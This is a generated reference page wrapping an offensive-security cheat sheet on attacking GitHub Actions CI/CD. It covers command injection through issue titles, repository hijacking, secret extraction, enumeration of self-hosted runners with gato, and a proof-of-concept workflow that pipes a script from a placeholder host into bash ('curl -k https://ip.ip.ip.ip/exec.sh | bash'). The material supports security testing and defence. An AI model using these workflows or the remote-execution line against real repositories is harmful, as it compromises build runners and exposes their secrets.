---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# CI/CD - GitHub Actions

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-devops-cicd-github-actions` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/devops/cicd-github-actions.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [CI/CD - GitHub Actions](../../topics/devops/ci-cd-github-actions.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-devops-cicd-github-actions |
| name | CI/CD - GitHub Actions |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/devops/cicd-github-actions.md |

## Preserved Source Material

````yaml
_body: "# CI/CD - GitHub Actions\n\nGitHub Actions is GitHub’s built-in CI/CD automation tool that lets you build, test, and\
  \ deploy your code right from your GitHub repository. It runs workflows triggered by events like code pushes, pull requests,\
  \ or manual triggers.\n\n## Lab\n\n* [messypoutine/gravy-overflow](https://github.com/messypoutine/gravy-overflow/) - A\
  \ GitHub Actions Supply Chain CTF / Goat\n\n## Default Action\n\nThe configuration files for GH actions are located in the\
  \ directory `.github/workflows/`\n\nYou can tell if the action builds pull requests based on its trigger (`on`) instructions:\n\
  \n```yaml\non:\n  push:\n    branches:\n      - master\n  pull_request:\n```\n\nIn order to run a command in an action that\
  \ builds pull requests, add a `run` instruction to it.\n\n```yaml\njobs:\n  print_issue_title:\n    runs-on: ubuntu-latest\n\
  \    name: Command execution\n    steps:\n    - run: echo whoami\"\n```\n\n`workflow_dispatch` is a special trigger in GitHub\
  \ Actions that allows you to manually trigger a workflow from the GitHub UI or via the GitHub API.\n\n```yml\nname: example\n\
  on:\n  workflow_dispatch:\n  push:\n    branches: [ main ]\n  pull_request:\n    branches: [ main ]\n\njobs:\n  build:\n\
  \    runs-on: windows-2019\n\n    steps:\n      - name: Execute\n        run: |\n          whoami\n```\n\n## Misconfigured\
  \ Actions\n\nAnalyze repositories to find misconfigured Github actions.\n\n* [synacktiv/octoscan](https://github.com/synacktiv/octoscan)\
  \ - Octoscan is a static vulnerability scanner for GitHub action workflows.\n* [boostsecurityio/poutine](https://github.com/boostsecurityio/poutine)\
  \ - Poutine is a security scanner that detects misconfigurations and vulnerabilities in the build pipelines of a repository.\
  \ It supports parsing CI workflows from GitHub Actions and Gitlab CI/CD.\n\n    ```ps1\n    # Using Docker\n    $ docker\
  \ run ghcr.io/boostsecurityio/poutine:latest\n\n    # Analyze a local repository\n    $ poutine analyze_local .\n\n    #\
  \ Analyze a remote GitHub repository\n    $ poutine -token \"$GH_TOKEN\" analyze_repo messypoutine/gravy-overflow\n\n  \
  \  # Analyze all repositories in a GitHub organization\n    $ poutine -token \"$GH_TOKEN\" analyze_org messypoutine\n\n\
  \    # Analyze all projects in a self-hosted Gitlab instance\n    $ poutine -token \"$GL_TOKEN\" -scm gitlab -scm-base-uri\
  \ https://example.com org/repo\n    ```\n\n![GitHub-Actions-Attack-Diagram](https://raw.githubusercontent.com/jstawinski/GitHub-Actions-Attack-Diagram/refs/heads/main/GitHub%20Actions%20Attack%20Diagram.svg)\n\
  \n### Repository Hijacking\n\nWhen the action is using a non-existing action, Github username or organization.\n\n```yaml\n\
  - uses: non-existing-org/checkout-action\n```\n\n> :warning: To protect against repojacking, GitHub employs a security mechanism\
  \ that disallows the registration of previous repository names with 100 clones in the week before renaming or deleting the\
  \ owner's account. [The GitHub Actions Worm: Compromising GitHub Repositories Through the Actions Dependency Tree - Asi\
  \ Greenholts](https://www.paloaltonetworks.com/blog/prisma-cloud/github-actions-worm-dependencies/)\n\n### Untrusted Input\
  \ Evaluation\n\nAn action may be vulnerable to command injection if it dynamically evaluates untrusted input as part of\
  \ its `run` instruction:\n\n```yaml\njobs:\n  print_issue_title:\n    runs-on: ubuntu-latest\n    name: Print issue title\n\
  \    steps:\n    - run: echo \"${{github.event.issue.title}}\"\n```\n\n### Extract Sensitive Variables and Secrets\n\n**Variables**\
  \ are used for non-sensitive configuration data. They are accessible only by GitHub Actions in the context of this environment\
  \ by using the variable context.\n\n**Secrets** are encrypted environment variables. They are accessible only by GitHub\
  \ Actions in the context of this environment by using the secret context.\n\n```yml\njobs:\n  build:\n    runs-on: ubuntu-latest\n\
  \    environment: env\n    steps:\n      - name: Access Secrets\n        env:\n            SUPER_SECRET_TOKEN: ${{ secrets.SUPER_SECRET_TOKEN\
  \ }}\n        run: |\n            echo SUPER_SECRET_TOKEN=$SUPER_SECRET_TOKEN >> local.properties\n```\n\n* [synacktiv/gh-hijack-runner](https://github.com/synacktiv/gh-hijack-runner)\
  \ - A python script to create a fake GitHub runner and hijack pipeline jobs to leak CI/CD secrets.\n\n## Self-Hosted Runners\n\
  \nA self-hosted runner for GitHub Actions is a machine that you manage and maintain to run workflows from your GitHub repository.\
  \ Unlike GitHub's own hosted runners, which operate on GitHub's infrastructure, self-hosted runners run on your own infrastructure.\
  \ This allows for more control over the hardware, operating system, software, and security of the runner environment.\n\n\
  Scan a public GitHub Organization for Self-Hosted Runners\n\n* [AdnaneKhan/Gato-X](https://github.com/AdnaneKhan/Gato-X)\
  \ - Fork of Gato - Gato (Github Attack TOolkit) - Extreme Edition\n* [praetorian-inc/gato](https://github.com/praetorian-inc/gato)\
  \ - GitHub Actions Pipeline Enumeration and Attack Tool\n\n    ```ps1\n    gato -s enumerate -t targetOrg -oJ target_org_gato.json\n\
  \    ```\n\nThere are 2 types of self-hosted runners: non-ephemeral and ephemeral.\n\n* **Ephemeral** runners are short-lived,\
  \ created to handle a single or limited number of jobs before being terminated. They provide isolation, scalability, and\
  \ enhanced security since each job runs in a clean environment.\n* **Non-ephemeral** runners are long-lived, designed to\
  \ handle multiple jobs over time. They offer consistency, customization, and can be cost-effective in stable environments\
  \ where the overhead of provisioning new runners is unnecessary.\n\nIdentify the type of self-hosted runner with `gato`:\n\
  \n```ps1\ngato e --repository vercel/next.js\n[+] The authenticated user is: swisskyrepo\n[+] The GitHub Classic PAT has\
  \ the following scopes: repo, workflow\n    - Enumerating: vercel/next.js!\n[+] The repository contains a workflow: build_and_deploy.yml\
  \ that might execute on self-hosted runners!\n[+] The repository vercel/next.js contains a previous workflow run that executed\
  \ on a self-hosted runner!\n    - The runner name was: nextjs-hel1-22 and the machine name was nextjs-hel1-22 and the runner\
  \ type was repository in the Default group with the following labels: self-hosted, linux, x64, metal\n[!] The repository\
  \ contains a non-ephemeral self-hosted runner!\n[-] The user can only pull from the repository, but forking is allowed!\
  \ Only a fork pull-request based attack would be possible.\n```\n\nExample of workflow to run on a non-ephemeral runner:\n\
  \n```yml\nname: POC\non:\n  pull_request:\n  \njobs:\n  security:\n    runs-on: non-ephemeral-runner-name\n\n    steps:\n\
  \      - name: cmd-exec\n        run: |\n          curl -k https://ip.ip.ip.ip/exec.sh | bash\n```\n\n## References\n\n\
  * [GITHUB ACTIONS EXPLOITATION: SELF HOSTED RUNNERS - Hugo Vincent - 17/07/2024](https://www.synacktiv.com/publications/github-actions-exploitation-self-hosted-runners)\n\
  * [GITHUB ACTIONS EXPLOITATION: REPO JACKING AND ENVIRONMENT MANIPULATION - Hugo Vincent - 10/07/2024](https://www.synacktiv.com/publications/github-actions-exploitation-repo-jacking-and-environment-manipulation)\n\
  * [GITHUB ACTIONS EXPLOITATION: DEPENDABOT - Hugo Vincent - 06/08/2024](https://www.synacktiv.com/publications/github-actions-exploitation-dependabot)\n\
  * [Weaponizing Dependabot: Pwn Request at its finest - Sébastien Graveline - 02/06/2025](https://boostsecurity.io/blog/weaponizing-dependabot-pwn-request-at-its-finest)"
_relative_path: devops/cicd-github-actions.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/devops/cicd-github-actions.md
````
